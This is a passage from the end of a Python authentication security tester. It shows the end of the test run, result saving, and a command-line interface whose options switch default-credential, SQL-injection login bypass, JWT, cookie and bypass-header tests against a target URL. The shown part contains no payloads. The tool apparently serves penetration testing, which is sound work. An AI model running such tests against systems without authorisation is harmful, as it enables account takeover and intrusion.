                self.results.findings.extend(bypass_findings)
                self.results.tests_run["auth_bypass_headers"] = len(bypass_findings)

        finally:
            if self._session:
                await self._session.close()

        self.results.duration_seconds = round(time.time() - start_time, 1)

        logger.info("=" * 60)
        logger.info("Authentication Security Test Complete")
        logger.info("=" * 60)
        summary = self.results.to_dict()["summary"]
        logger.info(f"Login forms found: {self.results.login_forms_found}")
        logger.info(f"Total findings: {summary['total_findings']}")
        for sev in ["critical", "high", "medium", "low", "info"]:
            if summary.get(sev, 0) > 0:
                logger.info(f"  {sev.upper()}: {summary[sev]}")
        logger.info(f"Duration: {self.results.duration_seconds}s")

        return self.results.to_dict()

    def save(self):
        output_path = Path(self.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(self.results.to_dict(), f, indent=2)
        logger.info(f"Results saved to {output_path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Authentication Security Tester - Default credentials, SQLi login bypass, JWT analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://example.com/login --no-headers
  %(prog)s https://example.com --rate 3 -t 20 -o auth_results.json
  %(prog)s https://example.com --no-sqli --no-jwt -v
        """,
    )
    parser.add_argument("target", help="Target URL to test (e.g., https://example.com)")
    parser.add_argument("-o", "--output", help="Output JSON file path")
    parser.add_argument("--rate", type=float, default=5.0, help="Max concurrent requests (default: 5)")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--no-default-creds", action="store_true", help="Skip default credential testing")
    parser.add_argument("--no-sqli", action="store_true", help="Skip SQL injection in login fields")
    parser.add_argument("--no-cookies", action="store_true", help="Skip session cookie analysis")
    parser.add_argument("--no-jwt", action="store_true", help="Skip JWT token analysis")
    parser.add_argument("--no-headers", action="store_true", help="Skip auth bypass header testing")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose/debug logging")
    parser.add_argument("--json-stdout", action="store_true", help="Print JSON results to stdout")
    return parser.parse_args()


async def main():
    args = parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    tester = AuthTester(
        target=args.target,
        output=args.output,
        rate_limit=args.rate,
        timeout=args.timeout,
        test_default_creds=not args.no_default_creds,
        test_sqli=not args.no_sqli,
        test_cookies=not args.no_cookies,
        test_jwt=not args.no_jwt,
        test_headers=not args.no_headers,
    )

    try:
        results = await tester.run()
        tester.save()

        if args.json_stdout:
            print(json.dumps(results, indent=2))

    except KeyboardInterrupt:
        logger.warning("Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Auth test failed: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
